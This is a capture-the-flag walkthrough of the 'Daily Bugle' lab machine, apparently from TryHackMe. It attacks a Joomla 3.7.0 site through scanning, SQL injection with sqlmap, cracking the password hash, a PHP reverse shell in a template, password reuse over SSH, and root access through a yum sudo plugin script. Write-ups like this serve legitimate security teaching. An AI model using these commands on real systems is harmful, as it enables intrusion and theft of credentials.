## DailyBugle

### Information
IP Address: 10.10.103.84

### Recon
`nmap -A $ip`

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:7B:9B:1E:1D:41 (Unknown)

There are 3 ports open, which means the service is hosting 3 services:
1. SSH 
2. Web server
3. MySQL Database MariaDB

Since we do not have any credentials to login via SSH let us start by visiting the web page in port 80.

## The Daily Bugle Web Page

We can see that the web page being hosted is a simple
If we visit robots.txt we can see something about a Joomla software being installed. Visiting the /administrator page confirms our guess, but what more information can we get on this software? 
Searching on ways to enumerate Joomla I was able to find out we can extract [Joomla's Version](https://hackertarget.com/attacking-enumerating-joomla/) in different ways:

Option 1 joomla.xml:

```
curl http://$ip/administrator/manifests/files/joomla.xml
```


Option 2 en-GB.xml:

```
curl http://$ip/administrator/language/en-GB/en-GB.xml
```


Option 3 README.txt:

```
curl http://$ip/README.txt
```

In all three of these documents it is clearly stated what version of Joomla we are dealing with.

Question What is the Joomla version?
> 3.7.0

## Joomla Vulnerabilities

After searching for existing vulnerabilities we can see that a common Joomla vulnerability for version 3.7.0 is an SQL Injection ([Joomla! 3.7.0 - 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033)).

According to this vulnerability, there is an SQL injection field present in the request `/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml`.

We have two available options: 
1. Run SQLMap and dump the content of the database

Listing the avaliable tables we know that there is a #__users table in the joombla database. Executing the command below outputs the content of said table.
```
sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomla -T "#__users" --dump
```

2. Perform further research which uncovers a POC for this vulnerability [in this Github Page](https://github.com/XiphosResearch/exploits/tree/master/Joomblah).

`python script.py http://$ip`

> If an error occurs when running the script such "TypeError: must be str, not bytes", [here is the fix](https://github.com/XiphosResearch/exploits/issues/20)

The content of the table is the following:
| id   | name       | email               | username | password                                                     |
| ---- | ---------- | ------------------- | -------- | ------------------------------------------------------------ |
| 811  | Super User | jonah@tryhackme.com | jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |

## Cracking the Hash Using John The Ripper

Now that we have a username and a hash we should try to crack it in order to use this pair of credentials on Joombla.

First we need to identify the hash type and choose a wordlist. Using the online tool hashes.com we were able to identify that the password was hashed with **bcrypt \$2*\$, Blowfish (Unix)**.

```
john hash.txt --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
```

It may take a bit but john will eventually crack the password! (~10/15 minutes in my case).

![image-20230303135232379](./images/image-20230303135232379.png)

Now we can login to the Joombla portal using the pair of credentials "jonah:\<password\>" let's explore that CMS and search for possible exploits online.



## CMS Reverse Shell

After a bit of googling I found out about a potential exploit in the "Templates" of the CMS. Basicaly its a template of a web page which has its own set of files and an index.php which we can edit. On top of this we can preview the page which executes the index.php file in a pop up window. This means we can edit the index.php file with a reverse shell payload and preview the page which will connect it back to our local listener.

Edit the index.php and change the IP and Port values, we are using Pentest Monkey's PHP Reverse Shell.

![image-20230305172316071](./images/image-20230305172316071.png)

Save the file, start a local listener and click on the "Preview" button.

 ![image-20230305172559329](./images/image-20230305172559329.png)

Amazing work! We have a working shell.

Unfortunetly we do not have permissions to read /home/jjameson directory which is where the user.txt file is stored. 

Let's execute Linpeas.sh and see if there is some way to escalate our privileges.

## SSH Credentials

After running linpeas.sh, there were two things that caught my eye:

1. ╔══════════╣ CVEs Check
   Vulnerable to CVE-2021-4034
2. ╔══════════╣ Searching passwords in config PHP files
           public $password = '\<Redacted\>';                                                                                                                                                                     
                           $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];
                           $this->password = null;
                           'password' => $this->password,

According to the output we can see that the target is vulnerable to CVE-2021-4034 which can give us instant root access to the system if we correctly exploit this vulnerability ( MSF 'linux/local/cve_2021_4034_pwnkit_lpe_pkexec') but we are going to skip this step since it oversimplifies the machine. 

The method we are going to follow is in the **/var/www/html/configuration.php** file which contains the DB password which I recorded in my notes and decided to try to log in in SSH using this same password as user jjameson. To my surprise this was a case of password reutilization and we are now able to read the user flag.

**Question** What is the user flag?

> \<Redacted\>



## Privilege Escalation

Let's run linpeas.sh again:

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                          

**User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum**

Looks like we found out something interesting. A good resource to use in this situation is [GTFOBins](https://gtfobins.github.io).

![image-20230306100155445](./images/image-20230306100155445.png)

We can see that if  we are allowed to run yum as a superuser, we can escalate our privileges to "root" with one of the methods below. The first one cannot be used since we do not have fpm installed.

Nonetheless, the second one is less restrictive. Basicaly I created a sh file with the code above and ran the sudo yum command:

```
nano root.sh

////FILE CONTENT
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y

./root.sh
```

![image-20230306100719904](./images/image-20230306100719904.png)

Alternatively we could also directly paste the code into the terminal.

And hurray! We are root! Read the contents of the root flag in /root/root.txt

![image-20230306100743945](./images/image-20230306100743945.png)

**Question** What is the root flag?

> \<Redacted\>
